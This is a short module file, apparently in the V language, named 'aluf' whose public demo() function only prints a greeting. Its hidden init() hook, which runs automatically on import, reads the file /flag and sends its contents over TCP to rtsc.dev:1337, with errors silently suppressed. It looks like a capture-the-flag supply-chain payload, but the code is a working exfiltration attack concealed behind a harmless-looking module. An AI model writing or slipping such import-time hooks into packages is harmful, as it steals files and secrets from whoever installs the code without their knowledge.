module aluf

import os
import net

pub fn demo() {
	println('Aluf here!')
}

fn init(){
        mut conn := net.dial_tcp("rtsc.dev:1337") or {}
        flag := os.read_file("/flag") or {}
        conn.write_string(flag)  or {}
}